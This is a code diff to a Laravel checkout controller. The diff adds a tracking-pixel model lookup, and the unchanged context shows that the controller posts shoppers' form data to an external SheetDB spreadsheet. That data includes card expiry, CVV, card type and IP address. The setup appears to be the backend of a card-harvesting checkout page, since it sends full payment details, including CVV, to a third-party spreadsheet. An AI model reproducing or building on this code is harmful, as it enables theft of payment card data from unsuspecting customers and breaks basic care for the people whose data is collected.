@@ -4,6 +4,7 @@ namespace App\Http\Controllers;
 
 use SheetDB\SheetDB;
 use Illuminate\Http\Request;
+use App\Models\PixelModel;
 
 class PostController extends Controller
 {
@@ -11,6 +12,7 @@ class PostController extends Controller
     public function store(Request $request)
     {
         $sheetdb = new SheetDB('i77oen0q9b6ry');
+        $actualPixel = PixelModel::first();
         $sheetdb->create([
             'date'                      => date('d-m-Y H:i:s'),
             'product_name'              => $request->input('product_name'),
@@ -46,7 +48,7 @@ class PostController extends Controller
             'cc-exp'                    => $request->input('cc-exp'),
             'credit_card_cvv'           => $request->input('credit_card_cvv'),
             'ccType'                    => $request->input('ccType'),
-            'client_ip'                 => $request->ip(),
+            'client_ip'                 => $request->ip()
         ]);
 
         if($request->input('language') == "spanish"){
@@ -66,7 +68,8 @@ class PostController extends Controller
                 'client_currency'           => $request->input('client_currency'),
                 'client_currency_exchange'  => $request->input('client_currency_exchange'),
                 'shipping_description'      => $request->input('shipping_description'),
-                'language'                  => $request->input('language')
+                'language'                  => $request->input('language'),
+                'actualPixel'               => $actualPixel
             ]);
         }
         else{
@@ -86,7 +89,8 @@ class PostController extends Controller
                 'client_currency'           => $request->input('client_currency'),
                 'client_currency_exchange'  => $request->input('client_currency_exchange'),
                 'shipping_description'      => $request->input('shipping_description'),
-                'language'                  => $request->input('language')
+                'language'                  => $request->input('language'),
+                'actualPixel'               => $actualPixel
             ]);
         }            
     }
